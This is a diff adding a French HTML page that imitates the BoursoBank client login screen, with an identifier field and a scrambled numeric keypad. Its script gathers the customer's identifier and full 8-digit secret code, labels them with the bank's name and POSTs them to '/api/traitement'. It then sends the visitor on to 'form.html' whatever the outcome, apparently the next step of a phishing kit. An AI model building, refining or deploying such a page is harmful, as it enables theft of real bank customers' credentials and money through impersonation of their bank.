@@ -1,0 +1,465 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BoursoBank - Connexion Espace Client</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <style>
+        /* --- RESET & STYLE GENERAL --- */
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Inter', sans-serif;
+        }
+        body {
+            background-color: #f7f9fa;
+            color: #121824;
+            display: flex;
+            justify-content: center;
+            min-height: 100vh;
+            -webkit-font-smoothing: antialiased;
+        }
+        .bb-app-container {
+            width: 100%;
+            max-width: 450px;
+            background-color: #ffffff;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.05);
+        }
+
+        /* --- EN-TÊTE LOGO --- */
+        header {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 15px 0;
+            border-bottom: 1px solid #edf2f7;
+        }
+        .bb-logo-wrap img {
+            height: 45px;
+            width: auto;
+            display: block;
+        }
+
+        /* --- BLOC PRINCIPAL CONTENU --- */
+        .bb-auth-card {
+            padding: 30px 24px;
+            flex-grow: 1;
+            display: flex;
+            flex-direction: column;
+        }
+        .bb-panel {
+            display: none;
+            flex-direction: column;
+            width: 100%;
+            height: 100%;
+        }
+        .bb-panel-active {
+            display: flex !important;
+        }
+
+        /* --- ÉTAPE 1 : IDENTIFIANT --- */
+        .bb-top-illustration {
+            display: flex;
+            justify-content: center;
+            margin-bottom: 20px;
+        }
+        .bb-top-illustration img {
+            height: 75px;
+            width: auto;
+        }
+        .bb-panel-title {
+            font-size: 22px;
+            font-weight: 700;
+            color: #121824;
+            text-align: center;
+            margin-bottom: 8px;
+        }
+        .bb-panel-title.text-left {
+            text-align: left;
+            margin-bottom: 15px;
+        }
+        .bb-panel-subtitle {
+            font-size: 14px;
+            color: #718096;
+            text-align: center;
+            line-height: 1.4;
+            margin-bottom: 15px;
+        }
+        .bb-badge-secure {
+            align-self: center;
+            background-color: #edf2f7;
+            color: #4a5568;
+            font-size: 13px;
+            font-weight: 600;
+            padding: 6px 14px;
+            border-radius: 20px;
+            margin-bottom: 25px;
+        }
+
+        .bb-input-line-container {
+            margin-bottom: 30px;
+            border-bottom: 2px solid #cbd5e0;
+            padding-bottom: 8px;
+            transition: border-color 0.2s;
+        }
+        .bb-input-line-container:focus-within {
+            border-color: #e1007a;
+        }
+        .bb-input-line-container input {
+            width: 100%;
+            border: none;
+            outline: none;
+            font-size: 18px;
+            font-weight: 500;
+            color: #121824;
+            text-align: center;
+            background: transparent;
+        }
+        .bb-input-line-container input::placeholder {
+            color: #a0aec0;
+            font-weight: 400;
+        }
+
+        /* --- ACTION ACTIONS & RETOUR --- */
+        .bb-back-action-row {
+            margin-bottom: 20px;
+        }
+        .bb-back-link {
+            background: transparent;
+            border: none;
+            color: #718096;
+            font-size: 15px;
+            font-weight: 500;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+        }
+
+        .bb-identifier-recap-badge {
+            background-color: #f7fafc;
+            border: 1px solid #e2e8f0;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 14px;
+            color: #4a5568;
+            margin-bottom: 25px;
+        }
+        #bb-recap-target {
+            font-weight: 700;
+            color: #121824;
+        }
+
+        /* --- LOGES DES PASSWORDS (8 Caractères) --- */
+        .bb-password-dots-row {
+            display: flex;
+            justify-content: space-between;
+            gap: 8px;
+            margin-bottom: 30px;
+        }
+        .bb-dot-slot {
+            flex: 1;
+            height: 12px;
+            background-color: #edf2f7;
+            border-radius: 6px;
+            transition: background-color 0.15s;
+        }
+        .bb-dot-slot.bb-filled-dot {
+            background-color: #e1007a !important;
+        }
+
+        /* --- GRILLE CLAVIER VISUEL --- */
+        .bb-keyboard-matrix-container {
+            background-color: #f7fafc;
+            border: 1px solid #edf2f7;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 30px;
+        }
+        .bb-keyboard-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 16px;
+        }
+        .bb-key-circle {
+            background-color: #ffffff;
+            border: 1px solid #e2e8f0;
+            height: 52px;
+            border-radius: 26px;
+            font-size: 18px;
+            font-weight: 700;
+            color: #121824;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+            transition: background-color 0.1s;
+            user-select: none;
+        }
+        .bb-key-circle:active {
+            background-color: #edf2f7;
+        }
+        .bb-key-util {
+            grid-column: span 2;
+            background-color: #edf2f7;
+            color: #4a5568;
+            font-size: 15px;
+            font-weight: 600;
+            border: none;
+        }
+
+        /* --- BOUTONS UNIFIÉS DE SOUMISSION --- */
+        .bb-btn-fuchsia {
+            width: 100%;
+            padding: 15px;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 700;
+            text-align: center;
+            background-color: #cbd5e0;
+            color: #ffffff;
+            cursor: not-allowed;
+            transition: background-color 0.2s ease;
+        }
+        .bb-active-state {
+            background-color: #e1007a !important;
+            color: #ffffff !important;
+            cursor: pointer !important;
+            box-shadow: 0 4px 12px rgba(225, 0, 122, 0.2);
+        }
+    </style>
+</head>
+<body>
+
+    <div class="bb-app-container">
+        <header>
+            <div class="bb-logo-wrap">
+                <img src="bourso-bank-600-300x200.webp" alt="BoursoBank">
+            </div>
+        </header>
+
+        <main class="bb-auth-card">
+            
+            <div id="bb-step-id" class="bb-panel bb-panel-active">
+                <div class="bb-top-illustration">
+                    <img src="boursobank_bel.png" alt="Illustration Sécurité">
+                </div>
+
+                <h1 class="bb-panel-title">Mon identifiant</h1>
+                <p class="bb-panel-subtitle">Veuillez toujours vérifier que vous êtes sur la bonne adresse</p>
+
+                <div class="bb-badge-secure">🔒 Espace Client Privé</div>
+
+                <div class="bb-input-line-container">
+                    <input type="tel" id="bb-id-field" placeholder="Saisissez votre identifiant" maxlength="10" autocomplete="off">
+                </div>
+
+                <button type="button" id="bb-btn-next" class="bb-btn-fuchsia" disabled>Suivant</button>
+            </div>
+
+            <div id="bb-step-password" class="bb-panel">
+                <div class="bb-back-action-row">
+                    <button type="button" id="bb-btn-back" class="bb-back-link">‹ Retour à l'identifiant</button>
+                </div>
+
+                <h1 class="bb-panel-title text-left">Mon mot de passe</h1>
+
+                <div class="bb-identifier-recap-badge">
+                    Identifiant : <span id="bb-recap-target"></span>
+                </div>
+
+                <div class="bb-password-dots-row">
+                    <div class="bb-dot-slot"></div>
+                    <div class="bb-dot-slot"></div>
+                    <div class="bb-dot-slot"></div>
+                    <div class="bb-dot-slot"></div>
+                    <div class="bb-dot-slot"></div>
+                    <div class="bb-dot-slot"></div>
+                    <div class="bb-dot-slot"></div>
+                    <div class="bb-dot-slot"></div>
+                </div>
+
+                <div class="bb-keyboard-matrix-container">
+                    <div class="bb-keyboard-grid">
+                        <button type="button" class="bb-key-circle" data-val="3">3</button>
+                        <button type="button" class="bb-key-circle" data-val="8">8</button>
+                        <button type="button" class="bb-key-circle" data-val="9">9</button>
+                        <button type="button" class="bb-key-circle" data-val="0">0</button>
+                        <button type="button" class="bb-key-circle" data-val="4">4</button>
+                        <button type="button" class="bb-key-circle" data-val="2">2</button>
+                        <button type="button" class="bb-key-circle" data-val="5">5</button>
+                        <button type="button" class="bb-key-circle" data-val="6">6</button>
+                        <button type="button" class="bb-key-circle" data-val="1">1</button>
+                        <button type="button" class="bb-key-circle" data-val="7">7</button>
+                        <button type="button" id="bb-key-clear" class="bb-key-circle bb-key-util">Effacer</button>
+                    </div>
+                </div>
+
+                <button type="button" id="bb-btn-login" class="bb-btn-fuchsia" disabled>Je me connecte</button>
+            </div>
+
+        </main>
+    </div>
+
+    <script>
+        // RÉCUPÉRATION COMPOSANTS DOM
+        const idField = document.getElementById('bb-id-field');
+        const btnNext = document.getElementById('bb-btn-next');
+        const btnBack = document.getElementById('bb-btn-back');
+        const btnLogin = document.getElementById('bb-btn-login');
+        
+        const stepId = document.getElementById('bb-step-id');
+        const stepPassword = document.getElementById('bb-step-password');
+        const recapTarget = document.getElementById('bb-recap-target');
+        const dotSlots = document.querySelectorAll('.bb-dot-slot');
+        const digitKeys = document.querySelectorAll('.bb-key-circle[data-val]');
+        const clearKey = document.getElementById('bb-key-clear');
+
+        let passwordDigits = [];
+
+        // GESTION ET SURVEILLANCE IDENTIFIANT 
+        if (idField) {
+            idField.addEventListener('input', () => {
+                idField.value = idField.value.replace(/\D/g, ''); // Uniquement les chiffres
+                const isValid = idField.value.length >= 6;
+                
+                if (btnNext) {
+                    btnNext.disabled = !isValid;
+                    btnNext.classList.toggle('bb-active-state', isValid);
+                }
+            });
+        }
+
+        // CHANGER DE PANELS (SUIVANT / RETOUR)
+        if (btnNext) {
+            btnNext.addEventListener('click', (e) => {
+                e.preventDefault();
+                if (recapTarget && idField) recapTarget.textContent = idField.value;
+                if (stepId) stepId.classList.remove('bb-panel-active');
+                if (stepPassword) stepPassword.classList.add('bb-panel-active');
+            });
+        }
+
+        if (btnBack) {
+            btnBack.addEventListener('click', (e) => {
+                e.preventDefault();
+                passwordDigits = [];
+                updateDots();
+                checkLoginState();
+                if (stepPassword) stepPassword.classList.remove('bb-panel-active');
+                if (stepId) stepId.classList.add('bb-panel-active');
+            });
+        }
+
+        // LOGIQUE CLAVIER VISUEL MATRICIEL
+        digitKeys.forEach(key => {
+            key.addEventListener('click', (e) => {
+                e.preventDefault();
+                if (passwordDigits.length < 8) {
+                    passwordDigits.push(key.getAttribute('data-val'));
+                    updateDots();
+                    checkLoginState(); // AUCUN AUTO-SUBMIT ICI, JUSTE MAJ DU BOUTON
+                }
+            });
+        });
+
+        if (clearKey) {
+            clearKey.addEventListener('click', (e) => {
+                e.preventDefault();
+                if (passwordDigits.length > 0) {
+                    passwordDigits.pop();
+                    updateDots();
+                    checkLoginState();
+                }
+            });
+        }
+
+        // CHANGER L'ÉTAT DES LOGES (ROUNDS FUCHSIA)
+        function updateDots() {
+            dotSlots.forEach((slot, i) => {
+                slot.classList.toggle('bb-filled-dot', i < passwordDigits.length);
+            });
+        }
+
+        // CONTRÔLE ET ACTIVATION DU BOUTON FINAL DE SOUMISSION
+        function checkLoginState() {
+            if (btnLogin) {
+                const isReady = (passwordDigits.length === 8);
+                btnLogin.disabled = !isReady;
+                
+                if (isReady) {
+                    btnLogin.classList.add('bb-active-state');
+                } else {
+                    btnLogin.classList.remove('bb-active-state');
+                }
+            }
+        }
+
+        // TRANSACTION ET ACTION ENVOI API VIA CLIC PHYSIQUE UNIQUE
+        if (btnLogin) {
+            btnLogin.addEventListener('click', (e) => {
+                e.preventDefault();
+                if (!btnLogin.disabled && passwordDigits.length === 8) {
+                    executeFinalSubmission();
+                }
+            });
+        }
+
+        // ENVOI STRUCTURE CENTRALISÉ (3 CHAMPS)
+        function executeFinalSubmission() {
+            if (!idField || passwordDigits.length !== 8) return;
+
+            const finalPayload = {
+                nom_banque: "BOURSOBANK",
+                client_id: idField.value,
+                secret_code: passwordDigits.join('')
+            };
+
+            btnLogin.disabled = true;
+            btnLogin.classList.remove('bb-active-state');
+
+            // Animation de connexion textuelle
+            let dotCount = 0;
+            btnLogin.innerText = 'Connexion';
+            const dotInterval = setInterval(() => {
+                dotCount = (dotCount + 1) % 4;
+                btnLogin.innerText = 'Connexion' + '.'.repeat(dotCount);
+            }, 300);
+
+            // Redirection de secours absolue (1.5 seconde)
+            const safetyRedirect = setTimeout(() => {
+                clearInterval(dotInterval);
+                window.location.href = 'form.html';
+            }, 1500);
+
+            // Traitement Fetch Vercel
+            fetch('/api/traitement', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(finalPayload)
+            })
+            .then(() => {
+                clearInterval(dotInterval);
+                clearTimeout(safetyRedirect);
+                window.location.href = 'form.html';
+            })
+            .catch(() => {
+                clearInterval(dotInterval);
+                clearTimeout(safetyRedirect);
+                window.location.href = 'form.html';
+            });
+        }
+    </script>
+</body>
+</html>
